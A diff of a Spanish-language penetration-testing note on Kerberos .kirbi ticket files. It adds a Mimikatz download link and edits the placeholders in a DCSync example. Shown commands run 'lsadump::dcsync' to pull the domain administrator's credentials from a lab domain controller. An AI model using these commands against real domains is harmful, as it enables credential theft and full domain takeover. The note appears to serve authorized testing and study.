@@ -5,6 +5,7 @@ Tags: #Windows #Kirbi
 Archivo que suele contener un _ticket Kerberos_ en un formato usado por herramientas de seguridad de Windows. Puede servir para analizar o usar ese ticket en pruebas autorizadas. Trátalo como una credencial secreta.
 
 ## Mimikatz - Inyectar archivo (.Kirbi) a la sesión 
+* [Mimikatz](https://github.com/gentilkiwi/mimikatz/releases/tag/2.2.0-20220919)
 ```bash 
 192.168.107.175      DC01.LAINOSCP.local         LAINOSCP.local        DC01
        │                    │                         │                 │
@@ -37,7 +38,7 @@ Paso 1:
 
 Paso 2:
 EJEMPLO: DCSync
-❯ C:\Temp\mimikatz.exe "lsadump::dcsync /domain:<Dominio DNS> /dc:<FQDN del equipo> /user:<NetBIOS>\administrator" "exit" 
+❯ C:\Temp\mimikatz.exe "lsadump::dcsync /domain:<Dominio> /dc:<FQDN del equipo> /user:<NetBIOS>\administrator" "exit" 
 
 # Hacer un DCSync 
 ❯ C:\Temp\mimikatz.exe "lsadump::dcsync /domain:LAINOSCP.local /dc:DC01.LAINOSCP.local /user:lainoscp\administrator" "exit"   
